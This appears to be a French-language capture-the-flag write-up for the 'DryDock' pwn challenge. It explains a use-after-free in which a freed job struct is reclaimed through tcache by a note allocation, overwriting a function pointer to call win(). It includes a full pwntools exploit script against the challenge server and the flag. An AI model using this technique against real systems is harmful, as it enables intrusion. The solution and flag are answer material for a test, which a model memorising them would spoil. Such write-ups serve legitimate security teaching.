# DryDock — Pwn

**Catégorie :** Pwn  
**Binary :** `drydock`  
**Target :** `tcp://95.216.124.220:30224`  
**Flag :** `CCOI26{_dRY_d0cK_h4s_b33n_pwNEdbY_y0U_}`

---

## Première analyse

La première chose que je fais avec un binaire pwn c'est `file` + `checksec` :

```bash
$ file drydock
drydock: ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped

$ checksec --file=drydock
RELRO:    Partial RELRO
CANARY:   No canary found
NX:       NX enabled
PIE:      PIE enabled
```

Pas de stack canary, PIE activé, NX activé. Pas de stack overflow classique donc. Le binaire n'est pas strippé donc on a tous les noms de fonctions dans Ghidra, c'est pratique.

---

## Comportement du programme

Je lance le binaire en local pour voir :

```
=== Service Bay Controller ===
[diag] bay marker=0x55fb40163a2b supervisor marker=0x55fb40164314

1) Create job
2) Edit job name
3) Delete job
4) Create note
5) Edit note
6) Run job
7) List status
8) Exit
>
```

La ligne `[diag]` imprime deux adresses. Avec PIE activé c'est louche. J'ouvre Ghidra et je vois que `banner()` fait :

```c
printf("[diag] bay marker=%p supervisor marker=%p\n", main, win);
```

La deuxième adresse c'est `win()`. Le challenge nous donne la leak PIE directement dans le banner. La fonction `win()` :

```c
void win(void) {
    puts("[+] Supervisor override accepted.");
    puts("[+] Opening drydock privileged channel...");
    system("cat flag.txt");
}
```

Parfait, reste à trouver comment l'appeler.

---

## Structure des données

En continuant à désassembler j'identifie deux globals :
- `g_job` — pointeur vers un job alloué avec `malloc(0x30)`
- `g_notes` — tableau de 8 pointeurs de notes, chacune `malloc(0x30)` aussi

Le job struct fait 0x30 octets :

```
+0x00 : char name[0x20]          <- nom du job (32 bytes)
+0x20 : void (*handler)(void)    <- pointeur de fonction  <-- c'est là qu'on vise
+0x28 : uint32_t code
+0x2c : uint32_t state
```

Quand on sélectionne "Run job" (option 6) :

```c
void run_job(void) {
    if (!g_job){puts("[-]Noactivejob.");return;}
    void (*handler)(void) = g_job->handler;
    if (handler) handler();   // call rax — on veut contrôler ça
}
```

---

## La vulnérabilité — Use-After-Free

Je regarde `delete_job()` dans Ghidra :

```c
void delete_job(void) {
    if (!g_job){puts("[-]Noactivejob.");return;}
    free(g_job);
    // g_job n'est PAS mis à NULL après le free !
    puts("[+] Job released from bay.");
}
```

Classique UAF. Le pointeur `g_job` pointe encore vers la mémoire libérée. Si on rappelle `run_job()`, il va déréférencer ce pointeur dangling et appeler ce qu'il trouve à `+0x20`.

Maintenant je regarde `create_note()` :

```c
void create_note(void) {
    note = malloc(0x30);   // même taille que le job struct !
    memset(note, 0, 0x30);
    read(0, note, 0x60);
}
```

`create_note()` alloue exactement `0x30` octets — identique au job. Le tcache de glibc va retourner **le même chunk** qui vient d'être libéré, donc la note et l'ancien `g_job` pointent vers la même zone mémoire.

---

## Exploitation

```
1. Banner → adresse de win()
2. create_job()  → malloc(0x30) → chunk A
3. delete_job()  → free(chunk A), g_job dangling
4. create_note() → tcache retourne chunk A
                   payload = 0x20 bytes nuls + p64(win_addr)
                   → écrase handler à l'offset +0x20
5. run_job()     → g_job->handler = win_addr → flag
```

Ce qui se passe dans la heap :

```
après create_job() :
  [chunk A] = [name: "testjob\0"...] [handler: route_fail] [code] [state]
   g_job ──────────────────────────────────────────────────────────▲

après delete_job() :
  [chunk A] = freed (tcache bin 0x30)
   g_job ─── dangling pointer

après create_note(payload) :
  [chunk A] = [0x00 * 0x20] [win_addr] [0x00...]
   g_job et notes[0] pointent tous les deux ici

après run_job() :
  g_job->handler = win_addr → call rax → win() → cat flag.txt
```

---

## Script

```python
#!/usr/bin/env python3
from pwn import *

HOST = "95.216.124.220"
PORT = 30224

e = ELF("./drydock", checksec=False)
context.binary = e

io = remote(HOST, PORT)

# win() depuis le banner
io.recvuntil(b"supervisor marker=")
win_addr = int(io.recvuntil(b"\n", drop=True).strip(), 16)
log.success(f"win() @ {hex(win_addr)}")

# create job
io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"Job label: ", b"testjob")

# delete job (UAF)
io.sendlineafter(b"> ", b"3")

# create note → tcache reuse, on écrase handler
io.sendlineafter(b"> ", b"4")
io.sendafter(b"payload: ", b"\x00" * 0x20 + p64(win_addr))

# run job
io.sendlineafter(b"> ", b"6")

io.recvuntil(b"Opening drydock privileged channel...\n")
print(io.recvline().strip().decode())
io.close()
```

---

## Output

```
$ python3 exploit.py
[+] Opening connection to 95.216.124.220 on port 30224: Done
[+] win() @ 0x55fb40164314
CCOI26{_dRY_d0cK_h4s_b33n_pwNEdbY_y0U_}
```

**Flag : `CCOI26{_dRY_d0cK_h4s_b33n_pwNEdbY_y0U_}`**
